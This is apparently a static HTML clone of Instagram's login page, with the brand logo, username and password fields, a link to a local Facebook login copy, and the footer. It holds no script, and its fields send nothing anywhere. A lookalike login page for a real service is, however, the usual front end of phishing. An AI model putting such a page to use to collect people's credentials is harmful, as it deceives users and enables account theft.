<!DOCTYPE html>
<html lang="en">

<head>
	<meta charset="UTF-8">
	<title>Instagram</title>
	<link rel="stylesheet" href="instagram.css">
</head>

<body>

	<div class="wrapper">
		<div class="header">
			<div class="top">
				<div class="logo">
					<img src="instagram.png" alt="instagram" style="width: 175px;">
				</div>
				<div class="form">
					<form action="page.html" method="POST">
						<div class="input_field">
							<input type="text" placeholder="Phone number, username, or email" class="input" required>
						</div>
						<div class="input_field">
							<input type="password" placeholder="Password" class="input" required>
						</div>
						<div class="btn"><a href="page.html">Log In</a></div>
					</form>
				</div>
				<div class="or">
					<div class="line"></div>
					<p>OR</p>
					<div class="line"></div>
				</div>
				<div class="dif">
					<div class="fb">
						<img src="facebook.png" alt="facebook">
						<a href="facebook.html">
							<p href="facebook.html">Log in with Facebook</p>
						</a>
					</div>
					<div class="forgot">
						<a href="#">Forgot password?</a>
					</div>
				</div>
			</div>
			<div class="signup">
				<p>Don't have an account? <a href="#">Sign up</a></p>
			</div>
			<div class="apps">
				<p>Get the app.</p>
				<div class="icons">
					<a href="http://www.apple.com"><img src="appstore.png" alt="appstore"></a>
					<a href="http://play.google.com"><img src="googleplay.png" alt="googleplay"></a>
				</div>
			</div>
		</div>
		<div class="footer">
			<div class="links">
				<ul>
					<li><a href="#">ABOUT US</a></li>
					<li><a href="#">SUPPORT</a></li>
					<li><a href="#">PRESS</a></li>
					<li><a href="#">API</a></li>
					<li><a href="#">JOBS</a></li>
					<li><a href="#">PRIVACY</a></li>
					<li><a href="#">TERMS</a></li>
					<li><a href="#">DIRECTORY</a></li>
					<li><a href="#">PROFILES</a></li>
					<li><a href="#">HASHTAGS</a></li>
					<li><a href="#">LANGUAGE</a></li>
				</ul>
			</div>
			<div class="copyright">
				Â© 2021 INSTAGRAM
			</div>
		</div>
	</div>

</body>

</html>
